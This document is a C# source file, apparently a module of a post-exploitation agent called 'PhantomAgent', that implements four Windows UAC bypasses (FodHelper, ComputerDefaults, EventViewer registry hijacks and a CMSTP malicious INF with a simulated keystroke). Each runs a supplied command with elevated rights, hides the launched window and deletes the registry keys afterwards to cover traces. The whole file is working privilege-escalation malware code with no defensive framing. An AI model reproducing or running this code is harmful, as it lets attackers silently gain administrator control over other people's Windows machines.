using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.Json;
using Microsoft.Win32;

namespace PhantomAgent.Modules;

public static class UacBypass
{
    public const string Name = "uac";

    public static Dictionary<string, Func<Dictionary<string, JsonElement>?, object>> GetCommands()
    {
        return new Dictionary<string, Func<Dictionary<string, JsonElement>?, object>>
        {
            ["uac_fodhelper"] = args => FodHelper(GetString(args, "command")),
            ["uac_cmstp"] = args => Cmstp(GetString(args, "command")),
            ["uac_computerdefaults"] = args => ComputerDefaults(GetString(args, "command")),
            ["uac_eventvwr"] = args => EventViewer(GetString(args, "command")),
        };
    }

    // FodHelper bypass: auto-elevating binary that reads command from ms-settings registry key
    private static Dictionary<string, object> FodHelper(string command)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        string regPath = @"Software\Classes\ms-settings\Shell\Open\command";
        try
        {
            using var key = Registry.CurrentUser.CreateSubKey(regPath);
            key.SetValue("", command);
            key.SetValue("DelegateExecute", "");

            Thread.Sleep(200);

            var psi = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\fodhelper.exe",
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden,
            };
            Process.Start(psi);
            Thread.Sleep(2000);

            return new Dictionary<string, object>
            {
                ["status"] = "ok",
                ["technique"] = "FodHelper",
                ["command"] = command,
            };
        }
        finally
        {
            CleanupKey(Registry.CurrentUser, @"Software\Classes\ms-settings");
        }
    }

    // CMSTP bypass: generates a malicious INF file, invokes via COM auto-elevate
    private static Dictionary<string, object> Cmstp(string command)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        // Create INF file that executes the command via ScriptRunner
        string infContent = $"""
            [version]
            Signature=$chicago$
            AdvancedINF=2.5
            [DefaultInstall]
            CustomDestination=CustInstDestSectionAllUsers
            RunPreSetupCommands=RunPreSetupCommandsSection
            [RunPreSetupCommandsSection]
            {command}
            taskkill /IM cmstp.exe /F
            [CustInstDestSectionAllUsers]
            49000,49001=AllUSer_LDIDSection, 7
            [AllUSer_LDIDSection]
            "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
            [Strings]
            ServiceName="PhantomVPN"
            ShortSvcName="PhantomVPN"
            """;

        string infPath = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid():N}.inf");
        try
        {
            File.WriteAllText(infPath, infContent);

            // Invoke CMSTP with /au (all users install) to trigger auto-elevation
            var psi = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmstp.exe",
                Arguments = $"/au \"{infPath}\"",
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            Process.Start(psi);

            // CMSTP shows a UAC-like dialog that auto-accepts for trusted binaries.
            // Send Enter keystroke after brief delay to dismiss it.
            Thread.Sleep(1500);
            NativeMethods.PostMessage(NativeMethods.FindWindow("", "PhantomVPN"), 0x0100, 0x0D, 0); // WM_KEYDOWN, VK_RETURN

            Thread.Sleep(2000);

            return new Dictionary<string, object>
            {
                ["status"] = "ok",
                ["technique"] = "CMSTP",
                ["command"] = command,
                ["inf_path"] = infPath,
            };
        }
        catch (Exception ex)
        {
            return new Dictionary<string, object> { ["status"] = "error", ["output"] = ex.Message };
        }
    }

    // ComputerDefaults bypass: same pattern as FodHelper, different auto-elevating binary
    private static Dictionary<string, object> ComputerDefaults(string command)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        string regPath = @"Software\Classes\ms-settings\Shell\Open\command";
        try
        {
            using var key = Registry.CurrentUser.CreateSubKey(regPath);
            key.SetValue("", command);
            key.SetValue("DelegateExecute", "");

            Thread.Sleep(200);

            var psi = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\computerdefaults.exe",
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden,
            };
            Process.Start(psi);
            Thread.Sleep(2000);

            return new Dictionary<string, object>
            {
                ["status"] = "ok",
                ["technique"] = "ComputerDefaults",
                ["command"] = command,
            };
        }
        finally
        {
            CleanupKey(Registry.CurrentUser, @"Software\Classes\ms-settings");
        }
    }

    // EventViewer bypass: mscfile handler hijack — eventvwr.exe reads HKCU\...\mscfile before HKCR
    private static Dictionary<string, object> EventViewer(string command)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return new Dictionary<string, object> { ["error"] = "Windows only" };

        string regPath = @"Software\Classes\mscfile\Shell\Open\command";
        try
        {
            using var key = Registry.CurrentUser.CreateSubKey(regPath);
            key.SetValue("", command);

            Thread.Sleep(200);

            var psi = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\eventvwr.exe",
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden,
            };
            Process.Start(psi);
            Thread.Sleep(2000);

            return new Dictionary<string, object>
            {
                ["status"] = "ok",
                ["technique"] = "EventViewer",
                ["command"] = command,
            };
        }
        finally
        {
            CleanupKey(Registry.CurrentUser, @"Software\Classes\mscfile");
        }
    }

    private static void CleanupKey(RegistryKey root, string path)
    {
        try { root.DeleteSubKeyTree(path, throwOnMissingSubKey: false); } catch { }
    }

    private static string GetString(Dictionary<string, JsonElement>? args, string key)
    {
        if (args == null || !args.TryGetValue(key, out var val))
            throw new ArgumentException($"Missing required argument: {key}");
        return val.GetString() ?? throw new ArgumentException($"Null value for: {key}");
    }

    private static class NativeMethods
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);
    }
}
